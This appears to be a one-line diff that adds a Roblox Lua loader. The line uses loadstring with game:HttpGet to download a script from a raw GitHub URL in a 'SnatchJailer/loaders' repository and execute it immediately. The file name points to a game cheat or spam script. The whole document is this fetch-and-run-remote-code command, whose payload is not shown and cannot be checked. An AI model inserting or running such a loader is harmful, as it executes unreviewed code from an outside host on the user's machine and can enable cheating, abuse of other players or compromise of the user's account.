@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SnatchJailer/loaders/main/loaders/huss-valley-spam4-x5a7zqh0mb9rrh.lua"))()
